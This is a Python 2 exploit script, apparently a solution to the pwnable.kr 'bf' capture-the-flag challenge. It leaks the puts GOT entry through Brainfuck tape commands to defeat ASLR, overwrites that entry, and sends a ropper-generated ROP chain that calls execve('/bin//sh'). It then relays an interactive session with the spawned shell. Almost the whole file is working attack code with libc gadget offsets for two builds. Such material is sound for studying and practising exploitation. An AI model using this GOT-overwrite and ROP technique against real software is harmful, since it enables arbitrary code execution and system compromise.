#!/usr/bin/env python
from subprocess import *
import sys
from os import *
from struct import *
from fcntl import *
from time import sleep
from select import select

my_libc_hash = 'f1012224a368beda8b2fe1bb259284ffde0b2ebdc4c6ecb4dbbc8e19210bf4cf'
my_libc_addrs = {
    # get_base
    'puts': 0x0005FCA0,
    # rop
    'pop_eax_ret': 0x0002406e,
    'pop_ecx_ret': 0x000b5377,
    'pop_tgt_ret': 0x000b5377,
    'mov_dword_ptr_tgt_eax_ret': 0x0018e312,
    'pop_ebx_ret': 0x00018395,
    'pop_edx_ret': 0x00001aa6,
    'int_80': 0x00002c87,
    # bf_input_addr
    'add_esp_5c_pop_ebx_esi_edi_ebp_ret': 0x0001cda5
}

bf_libc_hash = '2768c778d5f91ed909a33ef6842cff116b19f5fe305a32d5d52cef82a4cf13f9'

# No 'mov_dword_ptr_ecx_eax_ret' in this libc.
bf_libc_addrs = {
    # get_base
    'puts': 0x0005F020,
    # rop
    'pop_eax_ret': 0x00023f97,
    'pop_ecx_ret': 0x000b3f67,
    'pop_tgt_ret': 0x00001aa6,
    'mov_dword_ptr_tgt_eax_ret': 0x0006b22b,
    'pop_ebx_ret': 0x00018395,
    'pop_edx_ret': 0x00001aa6,
    'int_80': 0x00002c87,
    # bf_input_addr
    'add_esp_5c_pop_ebx_esi_edi_ebp_ret': 0x0001cd25
}

libcs = {
    my_libc_hash: my_libc_addrs,
    bf_libc_hash: bf_libc_addrs
}

# 0x804a018 <puts@got.plt>
# 0x804a0a0 <tape>
# tape - puts = 136

# ropper --file libc-2.23.so --chain execve
def rop(libc_hash, base):
    # Generated by ropper ropchain generator #

    p = lambda x : pack('I', x)

    # IMAGE_BASE_0 = 0x00000000 # libc-2.23.so
    IMAGE_BASE_0 = base
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)

    libc = libcs[libc_hash]

    rop = ''

    rop += rebase_0(libc['pop_eax_ret']) # 0x0002406e: pop eax; ret;
    rop += '//bi'
    rop += rebase_0(libc['pop_tgt_ret']) # 0x000b5377: pop ecx; ret;
    rop += rebase_0(0x001b2040)
    rop += rebase_0(libc['mov_dword_ptr_tgt_eax_ret']) # 0x0018e312: mov dword ptr [ecx], eax; ret;
    rop += rebase_0(libc['pop_eax_ret']) # 0x0002406e: pop eax; ret;
    rop += 'n/sh'
    rop += rebase_0(libc['pop_tgt_ret']) # 0x000b5377: pop ecx; ret;
    rop += rebase_0(0x001b2044)
    rop += rebase_0(libc['mov_dword_ptr_tgt_eax_ret']) # 0x0018e312: mov dword ptr [ecx], eax; ret;
    rop += rebase_0(libc['pop_eax_ret']) # 0x0002406e: pop eax; ret;
    rop += p(0x00000000)
    rop += rebase_0(libc['pop_tgt_ret']) # 0x000b5377: pop ecx; ret;
    rop += rebase_0(0x001b2048)
    rop += rebase_0(libc['mov_dword_ptr_tgt_eax_ret']) # 0x0018e312: mov dword ptr [ecx], eax; ret;
    rop += rebase_0(libc['pop_ebx_ret']) # 0x00018395: pop ebx; ret;
    rop += rebase_0(0x001b2040)
    rop += rebase_0(libc['pop_ecx_ret']) # 0x000b5377: pop ecx; ret;
    rop += rebase_0(0x001b2048)
    rop += rebase_0(libc['pop_edx_ret']) # 0x00001aa6: pop edx; ret;
    rop += rebase_0(0x001b2048)
    rop += rebase_0(libc['pop_eax_ret']) # 0x0002406e: pop eax; ret;
    rop += p(0x0000000b)
    rop += rebase_0(libc['int_80']) # 0x00002c87: int 0x80;

    # exit(42)
    # rop += rebase_0(0x00018395) # 0x00018395: pop ebx; ret;  ; mov ebx, 42
    # rop += p(42)                # ; exit code
    # rop += rebase_0(0x0002406e) # 0x0002406e: pop eax; ret;  ; mov eax, 1  SYS_exit on 32-bit Linux
    # rop += p(0x1)               # ; SYS_exit
    # rop += rebase_0(0x00002c87) # 0x00002c87: int 0x80;

    return rop

def bf_commands(libc_hash):
    # Send data to stdin and read it back.
    # Point puts@got.plt to tape + 4 (which is 0x804a0a4).
    # But leak the original bytes beforehand.
    pwn  = 'AAAA'       # padding, to see where [ebp-8] is in the input string
                        # yes, that's the start of the shellcode (this place)
    pwn += 'BBBB'
    # pwn += 'CCCC'
    # XXX: sets esp to this value + 4
    # XXX: ret would execute the instruction address at esp
    pwn += pack("I",0x804a0a0) # 0x804a0a4 <tape+4> -- controlled buffer

    # pwn += 'DDDD'       # XXX: used by ret (can be used for one of the leave) gadgets
    pwn += pack("I",0x08048549)  # 0x08048549: leave; ret;

    pwn += '<' * 136  # move the pointer to 0x804a018:
                    # puts@got.plt (tape - puts == 136)
    pwn += '.'          # leak the first byte
    pwn += '>.'         # leak the second byte
    pwn += '>.'         # leak the third byte
    pwn += '>.'         # leak the fourth byte
    pwn += '<<<,'       # overwrite the first byte
    pwn += '>,'         # overwrite the second byte
    pwn += '>,'         # overwrite the third byte
    pwn += '>,'         # overwrite the fourth byte

    pwn += '>' * 136  # move the pointer to (tape+4)

    l = len(rop(libc_hash, 0))     # the address shouldn't matter at this point
    pwn += '>,' * l     # input the byte and move the pointer
    pwn += '<'  * l     # move the pointer to the ROP start

    pwn += '['          # trigger the overwritten function 

    pwn += '\n'         # end of brainfuck commands (stdin is line-buffered)

    return pwn

def bf_input_addr(libc_hash, base):  # start of input for commands
    # 0x0001cda5: add esp, 0x5c; pop ebx; pop esi; pop edi; pop ebp; ret
    libc = libcs[libc_hash]
    addr = libc['add_esp_5c_pop_ebx_esi_edi_ebp_ret']
    return pack("I", addr + base)

def bf_input_rop(libc_hash, base):
    return rop(libc_hash, base)

def bytes_to_int(bs):
    return unpack("I", ''.join(bs))[0]

def get_base(libc_hash, stream, pr=True):
    puts = libcs[libc_hash]['puts']

    # Read the greeting.
    stream.readline()
    stream.readline()

    # Read the bytes back.
    puts_aslr = bytes_to_int(stream.read(4)) 
    base = abs(puts_aslr - puts)
    if pr:
        print "puts: " + hex(puts_aslr)
        print "text base: " + hex(base)
    return base

# Need a named pipe to pass output to input.
# mkfifo in
# cat in | tee in.log | ./getchar | tee out.log > in
#
# (gdb) !mkfifo in
# (gdb) r < <(cat in | ./solution.py "in") > >(./solution.py "out" > in)
#
# (gdb) r < <(cat in | tee in.log | ./solution.py "in") > >(./solution.py "out" | tee out.log > in)
#
# (gdb) r < <(cat in | tee in1.log | ./solution.py "in" | tee in2.log) > >(tee
# out1.log | ./solution.py "out" | tee out2.log  > in)
#
# r < <(cat in | tee in1.log | ./solution.py libc-2.23.so "in" | tee in2.log) >
# >(tee out1.log | ./solution.py libc-2.23.so "out" | tee out2.log  > in)

def get_hash(fname):
    plat = sys.platform
    if plat.startswith("linux"):
        cmd = "sha256sum " + fname + " | cut -f1 -d' '"
    elif plat.startswith("darwin"):
        cmd = "shasum -a 256 " + fname + " | cut -f1 -d' '"
    else:
        print "Unsupported platform"
        exit(1)
    return check_output(cmd, shell=True).strip()

if len(sys.argv) > 1:
    libc_hash = get_hash(sys.argv[1])
    if (libcs.get(libc_hash) == None):
        print "Unknown libc"
        exit(1)
else:
    print "No libc specified"
    exit(1)

# GDB.
if len(sys.argv) > 2 and sys.argv[2] == "in":
    # Writes to stdout here go to 'bf' stdin.
    sys.stdout.write(bf_commands(libc_hash))
    sys.stdout.flush()  # blocks without flushing
    base = bytes_to_int(sys.stdin.read(4))
    # Overwrite 0x804a018 <puts@got.plt>.
    sys.stdout.write(bf_input_addr(libc_hash, base))
    sys.stdout.write(bf_input_rop(libc_hash, base))  # write ROP to the pipe
	
elif len(sys.argv) > 2 and sys.argv[2] == "out":
    base = get_base(libc_hash, sys.stdin, pr=False)
    sys.stdout.write(pack("I", base))


# ./solution.py
else:
    if len(sys.argv) > 2:
        # Capture the exit code.
        # exe = "./bf ; echo $?"
        exe = sys.argv[2]
    else:
        exe = "./bf"  # do not terminate early
        # exe = "nc pwnable.kr 9001"  # do not terminate early

    # 'shell=True' is needed to see when the child segfaults.
    p = Popen([exe], stdin=PIPE, stdout=PIPE, shell=True) 

    p.stdin.write(bf_commands(libc_hash))
    base = get_base(libc_hash, p.stdout)
    p.stdin.write(bf_input_addr(libc_hash, base))
    p.stdin.write(bf_input_rop(libc_hash, base))

    # Capture the exit code.
    # sys.stdout.write("exit: " + p.stdout.read())

    # Interact with stdin.

    # http://eyalarubas.com/python-subproc-nonblock.html
    s = p.stdout
    flags = fcntl(s.fileno(), F_GETFL)
    res = fcntl(s, F_SETFL, flags | O_NONBLOCK)

    # while True:
	# res = "" 
	# try:
	    # cmd = sys.stdin.readline()
	    # p.stdin.write(cmd)
	    # sleep(0.1)  # XXX: race condition
	    # while True:
		# c = p.stdout.read(1)
		# res += c

	# except (IOError, OSError) as e:  # no more data
	    # sys.stdout.write(res)

    while True:
        res = "" 

        cmd = sys.stdin.readline()
        if cmd == '':
            print "EOF reached"
            break
        p.stdin.write(cmd)

        while True:
            # print "read loop"
            # print "res: %s" % res
            (r,_,x) = select([p.stdout], [], [p.stdout], 0.3)
            if x != []:
                print "exception"
                break

            if r == []:
                # print "nothing to read"
                break

            if r != []:
                c = p.stdout.read(100)
                # print "read %d bytes" % len(c)
                res += c

        while True:
            # print "write loop"
            (_,w,x) = select([], [sys.stdout], [sys.stdout], 0.3)
            if x != []:
                print "exception"
                break

            if w == []:
                print "cannot write"
                break

            if w != []:
                # print "writing"
                # sys.stdout.write(str(len(res)))
                sys.stdout.write(res)
                # sys.stdout.write('\n')
                sys.stdout.flush()
                break
